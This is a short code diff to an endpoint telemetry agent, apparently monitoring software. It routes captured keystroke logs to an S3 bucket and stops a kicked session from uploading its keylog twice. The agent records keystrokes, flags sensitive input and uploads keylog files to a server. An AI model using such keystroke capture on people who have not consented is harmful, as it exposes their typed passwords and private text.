@@ -74,7 +74,8 @@ class AgentOrchestrator:
             enable_keystrokes=True,
             on_sensitive_activity=self.on_sensitive_input_detected,
             endpoint_id=self.endpoint_id,
-            endpoint_name=self.endpoint_name
+            endpoint_name=self.endpoint_name,
+            s3_bucket_name=CONFIG.get("s3_bucket_name")
         )
         self.crypto = CryptoEngine(CONFIG["crypto_key_hex"])
         self.api = TelemetryAPIClient(self.server_url)
@@ -248,7 +249,7 @@ class AgentOrchestrator:
             saved_file = self.tracker.save_snapshot_to_file(reason="kicked")
             if saved_file:
                 self._upload_keylog_file(saved_file)
-            self.terminate()
+            self.terminate(is_kicked=True)
             return
 
         if res and res.get("upload_url") and encrypted_media:
@@ -258,12 +259,13 @@ class AgentOrchestrator:
                 verified = self.api.confirm_media_upload(res["upload_complete_path"])
                 print(f"S3 database confirmation {'completed' if verified else 'failed'}")
 
-    def terminate(self):
+    def terminate(self, is_kicked: bool = False):
         self.timer.stop()
         self.tracker.set_keystrokes_enabled(False)
-        saved_file = self.tracker.save_snapshot_to_file(reason="end-session")
-        if saved_file:
-            self._upload_keylog_file(saved_file)
+        if not is_kicked:
+            saved_file = self.tracker.save_snapshot_to_file(reason="end-session")
+            if saved_file:
+                self._upload_keylog_file(saved_file)
         self.tracker.stop()
         try:
             disconnect_url = self.server_url.replace("/telemetry", f"/endpoints/{self.endpoint_id}/disconnect")
